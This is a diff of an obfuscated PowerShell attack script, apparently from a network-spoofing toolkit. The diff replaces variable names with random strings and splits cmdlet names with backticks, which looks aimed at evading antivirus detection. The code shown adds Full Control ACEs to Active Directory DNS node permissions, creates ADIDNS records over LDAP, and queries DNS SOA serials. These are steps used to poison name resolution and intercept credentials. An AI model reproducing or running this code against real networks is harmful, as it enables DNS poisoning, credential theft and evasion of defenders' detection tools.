+        $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay.Split(".")
 
-        ForEach($NiceFree in $BrickOwn)
+        ForEach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql)
         {
-            $GaudySoothe += ",DC=$NiceFree"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
 
         if($Credential)
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry("LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj",$Credential.UserName,$Credential.GetNetworkCredential().Password)
         }
         else
         {
-            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry "LDAP://$oOKRVkPmhffpDSkVLIFGzJKYJ/$UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj"
         }
 
         try
         {
-            $EqualWay = ne`w-`obje`ct System.Security.Principal.NTAccount($PiesLearn)
-            $NeedScare = $EqualWay.Translate([System.Security.Principal.SecurityIdentifier])
-            $VeinOffend = [System.Security.Principal.IdentityReference]$NeedScare
-            $CurvyMint = [System.DirectoryServices.ActiveDirectoryRights]$CheapRob
-            $StampTax = [System.Security.AccessControl.AccessControlType]$EarBucket
-            $SparkBrick = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
-            $SilkUse = ne`w-`obje`ct System.DirectoryServices.ActiveDirectoryAccessRule($VeinOffend,$CurvyMint,$StampTax,$SparkBrick)
+            $msubuZWknZydSnePBmnlnxgMTShSsWsErPGlAEM = ne`w`-`ob`je`ct System.Security.Principal.NTAccount($JAnXNgAfJiWSopRPSyvLZLuDFXIfMZZxhDd)
+            $DaPVrbQkdqezSeZcnzlDQVZI = $msubuZWknZydSnePBmnlnxgMTShSsWsErPGlAEM.Translate([System.Security.Principal.SecurityIdentifier])
+            $fEvuiRRFOyAwsqerxuLIQp = [System.Security.Principal.IdentityReference]$DaPVrbQkdqezSeZcnzlDQVZI
+            $cluoxCxRvjIBzSPssAtSQRhJUN = [System.DirectoryServices.ActiveDirectoryRights]$yamkLcrvzqIaaCjhkYeBlGUuzZQDlXUdJWRjBJI
+            $MJdpFrhPpHdExzLiiSWneUwzFJTGRJhBV = [System.Security.AccessControl.AccessControlType]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa
+            $PEJyKGoMSlfPBjxRICNZNervquEdmQpjDBDlOgTbBRqy = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
+            $CptsepRnFlNpzmkHQcKwzbFDOTZvHQcinSKWZwEw = ne`w`-`ob`je`ct System.DirectoryServices.ActiveDirectoryAccessRule($fEvuiRRFOyAwsqerxuLIQp,$cluoxCxRvjIBzSPssAtSQRhJUN,$MJdpFrhPpHdExzLiiSWneUwzFJTGRJhBV,$PEJyKGoMSlfPBjxRICNZNervquEdmQpjDBDlOgTbBRqy)
         }
         catch
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         }
 
         try
         {
-            $TownPack.psbase.ObjectSecurity.AddAccessRule($SilkUse)
-            $TownPack.psbase.CommitChanges()
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $PiesLearn to $FilmJazzy DACL") > $null
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.psbase.ObjectSecurity.AddAccessRule($CptsepRnFlNpzmkHQcKwzbFDOTZvHQcinSKWZwEw)
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.psbase.CommitChanges()
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $JAnXNgAfJiWSopRPSyvLZLuDFXIfMZZxhDd to $ifczfhVhxXUsXrLMmesQQ DACL") > $null
         }
         catch
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         }
 
-        if($TownPack.Path)
+        if($YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Path)
         {
-            $TownPack.Close()
+            $YqSgwpzqPMLdTWynnrihWkfWgMgqRgMwrpVl.Close()
         }
 
-        return $TableSteam
+        return $MHwNzNilRQNEbjvmyzuuQvvhzULRha
     }
     
     function New-ADIDNSNode
@@ -2080,107 +2080,107 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$IckyBloody,    
-            [parameter(Mandatory=$false)][String]$ChiefRate,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][String]$RipeYoke,
-            [parameter(Mandatory=$true)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
-            [parameter(Mandatory=$false)][String]$EarBucket,
-            [parameter(Mandatory=$false)][String]$PersonCheer,
-            [parameter(Mandatory=$false)][Int]$LethalArrive,
+            [parameter(Mandatory=$false)][String]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,    
+            [parameter(Mandatory=$false)][String]$SbRbNZHENTugWQyRptkleYHmgPaZleJRBd,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$false)][String]$VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP,
+            [parameter(Mandatory=$true)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa,
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
+            [parameter(Mandatory=$false)][Int]$SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
         $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
 
-        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
-        $BrickOwn = $DesireUnique.Split(".")
+        $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj = "DC=$ifczfhVhxXUsXrLMmesQQ,DC=$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,CN=MicrosoftDNS,DC=$zgPBavHAgJDNXciLWtpacZIBhUFjXbA"
+        $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql = $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay.Split(".")
 
-        foreach($NiceFree in $BrickOwn)
+        foreach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $QXPUUGTvFvsgCDcBGJhjxfcVwrNhmoIPqrJGcaCCMql)
         {
-            $GaudySoothe += ",DC=$NiceFree"
+            $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
 
-        [Byte[]]$StuffSnotty = New-DNSRecordArray -IckyBloody $IckyBloody -TrickWander $TrickWander -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
-        $FlapLovely = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapDirectoryIdentifier($TrickWander,389)
+        [Byte[]]$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW = New-DNSRecordArray -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
+        $ETgdPSydLbBasyiqXunFXLjZxzVCOvSquksyAWW = ne`w`-`ob`je`ct System.DirectoryServices.Protocols.LdapDirectoryIdentifier($oOKRVkPmhffpDSkVLIFGzJKYJ,389)
 
         if($Credential)
         {
-            $RoundFace = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapConnection($FlapLovely,$Credential.GetNetworkCredential())
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj = ne`w`-`ob`je`ct System.DirectoryServices.Protocols.LdapConnection($ETgdPSydLbBasyiqXunFXLjZxzVCOvSquksyAWW,$Credential.GetNetworkCredential())
         }
         else
         {
-            $RoundFace = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapConnection($FlapLovely)
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj = ne`w`-`ob`je`ct System.DirectoryServices.Protocols.LdapConnection($ETgdPSydLbBasyiqXunFXLjZxzVCOvSquksyAWW)
         }
 
-        $object_category = "CN=Dns-FilmJazzy,CN=Schema,CN=Configuration"
-        $JogAwake = $RipeYoke.Split(".")
+        $object_category = "CN=Dns-ifczfhVhxXUsXrLMmesQQ,CN=Schema,CN=Configuration"
+        $dGxdGqXMTsKxsDYaOzcbfYTGwXLmMaupvSiwyzBBX = $VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP.Split(".")
 
-        foreach($NiceFree in $JogAwake)
+        foreach($DjOefovaOWFeXyBLnlKhffMNEyjuu in $dGxdGqXMTsKxsDYaOzcbfYTGwXLmMaupvSiwyzBBX)
         {
-            $object_category += ",DC=$NiceFree"
+            $object_category += ",DC=$DjOefovaOWFeXyBLnlKhffMNEyjuu"
         }
         
         try
         {
-            $RoundFace.SessionOptions.Sealing = $true
-            $RoundFace.SessionOptions.Signing = $true
-            $RoundFace.Bind()
-            $RootSnail = ne`w-`obje`ct -TypeName System.DirectoryServices.Protocols.AddRequest
-            $RootSnail.DistinguishedName = $GaudySoothe
-            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass",@("top","dnsNode"))) > $null
-            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectCategory",$object_category)) > $null
-            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$StuffSnotty)) > $null
-            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
-            $RoundFace.SendRequest($RootSnail) > $null
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $FilmJazzy type $EarBucket added to $PersonCheer") > $null
-            $TableSteam = $true
-            $LightOval.ADIDNS_table.$FilmJazzy = "1"
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj.SessionOptions.Sealing = $true
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj.SessionOptions.Signing = $true
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj.Bind()
+            $irQNkPmLncuaNLHVNiMoU = ne`w`-`ob`je`ct -TypeName System.DirectoryServices.Protocols.AddRequest
+            $irQNkPmLncuaNLHVNiMoU.DistinguishedName = $UMlVzDlwSFqGkUcSAGJlrwbAtwGPLZj
+            $irQNkPmLncuaNLHVNiMoU.Attributes.Add((ne`w`-`ob`je`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass",@("top","dnsNode"))) > $null
+            $irQNkPmLncuaNLHVNiMoU.Attributes.Add((ne`w`-`ob`je`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectCategory",$object_category)) > $null
+            $irQNkPmLncuaNLHVNiMoU.Attributes.Add((ne`w`-`ob`je`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$dzGWnkfwLXsnPNxmeExtkDUrxVZlcHVZzsGvjxynnwW)) > $null
+            $irQNkPmLncuaNLHVNiMoU.Attributes.Add((ne`w`-`ob`je`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
+            $CwrpxaEqOLQsinsCiWWEtjTmPBGUOYFOeSHdoj.SendRequest($irQNkPmLncuaNLHVNiMoU) > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $ifczfhVhxXUsXrLMmesQQ type $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa added to $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC") > $null
+            $MHwNzNilRQNEbjvmyzuuQvvhzULRha = $true
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$ifczfhVhxXUsXrLMmesQQ = "1"
         }
         catch
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $TableSteam = $false
+            $MHwNzNilRQNEbjvmyzuuQvvhzULRha = $false
 
             if($_.Exception.Message -ne 'Exception calling "SendRequest" with "1" argument(s): "The object exists."')
             {
-                $LightOval.ADIDNS = $null
-                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-                $LightOval.ADIDNS_table.$FilmJazzy = "0"
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS = $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$ifczfhVhxXUsXrLMmesQQ = "0"
             }
 
         }
 
-        return $TableSteam
+        return $MHwNzNilRQNEbjvmyzuuQvvhzULRha
     }
 
-    function New-DonkeyFrail
+    function New-OsmYZXCshtqjAUQpMNVOdOrwX
     {
 
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][String]$PersonCheer
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
         )
 
-        $PersonCheer = $PersonCheer.ToLower()
+        $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC = $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC.ToLower()
 
-        function Convert-DataToUInt16($HeapShut)
+        function Convert-DataToUInt16($WRvUfEZvUzLaswvPDjydPmO)
         {
-            [Array]::Reverse($HeapShut)
-            return [System.BitConverter]::ToUInt16($HeapShut,0)
+            [Array]::Reverse($WRvUfEZvUzLaswvPDjydPmO)
+            return [System.BitConverter]::ToUInt16($WRvUfEZvUzLaswvPDjydPmO,0)
         }
 
-        function ConvertFrom-PacketOrderedDictionary($ClassyThird)
+        function ConvertFrom-PacketOrderedDictionary($BBBbyINUvQqRdfhjJGnOcUCXh)
         {
 
-            foreach($HeapShut in $ClassyThird.Values)
+            foreach($WRvUfEZvUzLaswvPDjydPmO in $BBBbyINUvQqRdfhjJGnOcUCXh.Values)
             {
-                $byte_array += $HeapShut
+                $byte_array += $WRvUfEZvUzLaswvPDjydPmO
             }
 
             return $byte_array
@@ -2188,32 +2188,32 @@ $StreetFound =
 
         function New-RandomByteArray
         {
-            param([Int]$PlaceBook,[Int]$WoodWrist=1,[Int]$WallWish=255)
+            param([Int]$GDrWuJgEKDiRKaJZfsVrNpYQc,[Int]$RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv=1,[Int]$MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT=255)
 
-            [String]$ToothWave = [String](1..$PlaceBook | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist $WoodWrist -WallWish $WallWish)})
-            [Byte[]]$ToothWave = $ToothWave.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            [String]$rQvIhbCYcgJnjexbvfzYl = [String](1..$GDrWuJgEKDiRKaJZfsVrNpYQc | ForEach-Object {"{0:X2}" -f (Get-rQvIhbCYcgJnjexbvfzYl -RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv $RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv -MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT $MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT)})
+            [Byte[]]$rQvIhbCYcgJnjexbvfzYl = $rQvIhbCYcgJnjexbvfzYl.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
 
-            return $ToothWave
+            return $rQvIhbCYcgJnjexbvfzYl
         }
 
         function New-DNSNameArray
         {
             param([String]$Name)
 
-            $NormalArch = $Name.ToCharArray()
-            [Array]$MoveTicket = 0..($NormalArch.Count - 1) | Where-Object {$NormalArch[$_] -eq '.'}
+            $sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC = $Name.ToCharArray()
+            [Array]$iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk = 0..($sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC.Count - 1) | Where-Object {$sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC[$_] -eq '.'}
 
-            if($MoveTicket.Count -gt 0)
+            if($iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk.Count -gt 0)
             {
 
                 $name_start = 0
 
-                foreach($ElatedCent in $MoveTicket)
+                foreach($anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF in $iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk)
                 {
-                    $name_end = $ElatedCent - $name_start
+                    $name_end = $anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF - $name_start
                     [Byte[]]$name_array += $name_end
                     [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
-                    $name_start = $ElatedCent + 1
+                    $name_start = $anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF + 1
                 }
 
                 [Byte[]]$name_array += ($Name.Length - $name_start)
@@ -2232,65 +2232,65 @@ $StreetFound =
         {
             param([String]$Name)
 
-            [Byte[]]$EarBucket = 0x00,0x06
+            [Byte[]]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa = 0x00,0x06
             [Byte[]]$name = (New-DNSNameArray $Name) + 0x00
-            [Byte[]]$PlaceBook = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
-            [Byte[]]$NimbleBrush = New-RandomByteArray 2
-            $EndAbrupt = ne`w-`obje`ct System.Collections.Specialized.OrderedDictionary
-            $EndAbrupt.Add("Length",$PlaceBook)
-            $EndAbrupt.Add("TransactionID",$NimbleBrush)
-            $EndAbrupt.Add("Flags",[Byte[]](0x01,0x00))
-            $EndAbrupt.Add("Questions",[Byte[]](0x00,0x01))
-            $EndAbrupt.Add("AnswerRRs",[Byte[]](0x00,0x00))
-            $EndAbrupt.Add("AuthorityRRs",[Byte[]](0x00,0x00))
-            $EndAbrupt.Add("AdditionalRRs",[Byte[]](0x00,0x00))
-            $EndAbrupt.Add("Queries_Name",$name)
-            $EndAbrupt.Add("Queries_Type",$EarBucket)
-            $EndAbrupt.Add("Queries_Class",[Byte[]](0x00,0x01))
+            [Byte[]]$GDrWuJgEKDiRKaJZfsVrNpYQc = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
+            [Byte[]]$SCOwArekXvsBLAysucdHjiVhhGztnzUzRooGd = New-RandomByteArray 2
+            $IlIZKvoVhjrPIpqYHfUi = ne`w`-`ob`je`ct System.Collections.Specialized.OrderedDictionary
+            $IlIZKvoVhjrPIpqYHfUi.Add("Length",$GDrWuJgEKDiRKaJZfsVrNpYQc)
+            $IlIZKvoVhjrPIpqYHfUi.Add("TransactionID",$SCOwArekXvsBLAysucdHjiVhhGztnzUzRooGd)
+            $IlIZKvoVhjrPIpqYHfUi.Add("Flags",[Byte[]](0x01,0x00))
+            $IlIZKvoVhjrPIpqYHfUi.Add("Questions",[Byte[]](0x00,0x01))
+            $IlIZKvoVhjrPIpqYHfUi.Add("AnswerRRs",[Byte[]](0x00,0x00))
+            $IlIZKvoVhjrPIpqYHfUi.Add("AuthorityRRs",[Byte[]](0x00,0x00))
+            $IlIZKvoVhjrPIpqYHfUi.Add("AdditionalRRs",[Byte[]](0x00,0x00))
+            $IlIZKvoVhjrPIpqYHfUi.Add("Queries_Name",$name)
+            $IlIZKvoVhjrPIpqYHfUi.Add("Queries_Type",$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa)
+            $IlIZKvoVhjrPIpqYHfUi.Add("Queries_Class",[Byte[]](0x00,0x01))
 
-            return $EndAbrupt
+            return $IlIZKvoVhjrPIpqYHfUi
         }
 
-        $DesertWorry = ne`w-`obje`ct System.Net.Sockets.TCPClient
-        $DesertWorry.Client.ReceiveTimeout = 3000
+        $QDcSFVGKhzQlcYGmPzRxMaXkRMfVFcaNhbVJXOl = ne`w`-`ob`je`ct System.Net.Sockets.TCPClient
+        $QDcSFVGKhzQlcYGmPzRxMaXkRMfVFcaNhbVJXOl.Client.ReceiveTimeout = 3000
 
         try
         {
-            $DesertWorry.Connect($TrickWander,"53")
-            $ActAlert = $DesertWorry.GetStream()
-            $EndAnts = ne`w-`obje`ct System.Byte[] 2048
-            $TartSomber = New-PacketDNSSOAQuery $PersonCheer
-            [Byte[]]$TourHealth = ConvertFrom-PacketOrderedDictionary $TartSomber
-            $ActAlert.Write($TourHealth,0,$TourHealth.Length) > $null
-            $ActAlert.Flush()   
-            $ActAlert.Read($EndAnts,0,$EndAnts.Length) > $null
-            $DesertWorry.Close()
-            $ActAlert.Close()
+            $QDcSFVGKhzQlcYGmPzRxMaXkRMfVFcaNhbVJXOl.Connect($oOKRVkPmhffpDSkVLIFGzJKYJ,"53")
+            $aXtpcsGgCtbOwWXPhTpktVFbnShnMxqLHkAMklbB = $QDcSFVGKhzQlcYGmPzRxMaXkRMfVFcaNhbVJXOl.GetStream()
+            $jwgtawmAcZFjeczaJnSWwtgqvznk = ne`w`-`ob`je`ct System.Byte[] 2048
+            $WvImuZpDZLWaQPcpwKxzEMPSevoREPfvnonNnvl = New-PacketDNSSOAQuery $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
+            [Byte[]]$uPnGNCscBYlQANpYsfci = ConvertFrom-PacketOrderedDictionary $WvImuZpDZLWaQPcpwKxzEMPSevoREPfvnonNnvl
+            $aXtpcsGgCtbOwWXPhTpktVFbnShnMxqLHkAMklbB.Write($uPnGNCscBYlQANpYsfci,0,$uPnGNCscBYlQANpYsfci.Length) > $null
+            $aXtpcsGgCtbOwWXPhTpktVFbnShnMxqLHkAMklbB.Flush()   
+            $aXtpcsGgCtbOwWXPhTpktVFbnShnMxqLHkAMklbB.Read($jwgtawmAcZFjeczaJnSWwtgqvznk,0,$jwgtawmAcZFjeczaJnSWwtgqvznk.Length) > $null
+            $QDcSFVGKhzQlcYGmPzRxMaXkRMfVFcaNhbVJXOl.Close()
+            $aXtpcsGgCtbOwWXPhTpktVFbnShnMxqLHkAMklbB.Close()
 
-            if($EndAnts[9] -eq 0)
+            if($jwgtawmAcZFjeczaJnSWwtgqvznk[9] -eq 0)
             {
-                $LightOval.output_queue.Add("[-] $PersonCheer SOA record not found") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC SOA record not found") > $null
             }
             else
             {
-                $UniqueRiver = [System.BitConverter]::ToString($EndAnts)
-                $UniqueRiver = $UniqueRiver -replace "-",""
-                $DrinkMisty = $UniqueRiver.IndexOf("C00C00060001")
-                $DrinkMisty = $DrinkMisty / 2
-                $CarveDusty = $EndAnts[($DrinkMisty + 10)..($DrinkMisty + 11)]
-                $CarveDusty = Convert-DataToUInt16 $CarveDusty
-                [Byte[]]$MistyValue = $EndAnts[($DrinkMisty + $CarveDusty - 8)..($DrinkMisty + $CarveDusty - 5)]
-                $HairQuiet = [System.BitConverter]::ToUInt32($MistyValue[3..0],0) + 1
-                [Byte[]]$DogsIcy = [System.BitConverter]::GetBytes($HairQuiet)[0..3]
+                $maiIxdKKAnVgnTKwmAFrqxUxmeYgIDIukwachV = [System.BitConverter]::ToString($jwgtawmAcZFjeczaJnSWwtgqvznk)
+                $maiIxdKKAnVgnTKwmAFrqxUxmeYgIDIukwachV = $maiIxdKKAnVgnTKwmAFrqxUxmeYgIDIukwachV -replace "-",""
+                $trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF = $maiIxdKKAnVgnTKwmAFrqxUxmeYgIDIukwachV.IndexOf("C00C00060001")
+                $trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF = $trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF / 2
+                $bJxJrtRkmhhZHLSfNWBSZlZHIZv = $jwgtawmAcZFjeczaJnSWwtgqvznk[($trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF + 10)..($trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF + 11)]
+                $bJxJrtRkmhhZHLSfNWBSZlZHIZv = Convert-DataToUInt16 $bJxJrtRkmhhZHLSfNWBSZlZHIZv
+                [Byte[]]$BOgqZkpPzXJREDPxStYAaTxNuYOJK = $jwgtawmAcZFjeczaJnSWwtgqvznk[($trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF + $bJxJrtRkmhhZHLSfNWBSZlZHIZv - 8)..($trTlDBAuhtYpuMtsKosRvAEWBfuiepDZQeQaTF + $bJxJrtRkmhhZHLSfNWBSZlZHIZv - 5)]
+                $xrcfDcWCqhEWlQcnmFNxiRlOccxeGmnb = [System.BitConverter]::ToUInt32($BOgqZkpPzXJREDPxStYAaTxNuYOJK[3..0],0) + 1
+                [Byte[]]$GfBavKgwBCdevYTJvYMiuNsDXCCvqdWAvTZ = [System.BitConverter]::GetBytes($xrcfDcWCqhEWlQcnmFNxiRlOccxeGmnb)[0..3]
             }
 
         }
         catch
         {
-            $LightOval.output_queue.Add("[-] $TrickWander did not respond on TCP port 53") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] $oOKRVkPmhffpDSkVLIFGzJKYJ did not respond on TCP port 53") > $null
         }
 
-        return [Byte[]]$DogsIcy
+        return [Byte[]]$GfBavKgwBCdevYTJvYMiuNsDXCCvqdWAvTZ
     }
 
     function New-DNSRecordArray
@@ -2299,40 +2299,40 @@ $StreetFound =
         [OutputType([Byte[]])]
         param
         (
-            [parameter(Mandatory=$false)][String]$IckyBloody,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$EarBucket = "A",
-            [parameter(Mandatory=$false)][String]$PersonCheer,
-            [parameter(Mandatory=$false)][Int]$OvertKnit,
-            [parameter(Mandatory=$false)][Int]$FemalePush,
-            [parameter(Mandatory=$false)][Int]$CobwebNeedle,
-            [parameter(Mandatory=$false)][Int]$SlipPorter,
-            [parameter(Mandatory=$false)][Int]$LethalArrive = 600,
-            [parameter(Mandatory=$false)][Int32]$SilkySelf,
-            [parameter(Mandatory=$false)][Switch]$NailMixed,
-            [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
+            [parameter(Mandatory=$false)][String]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
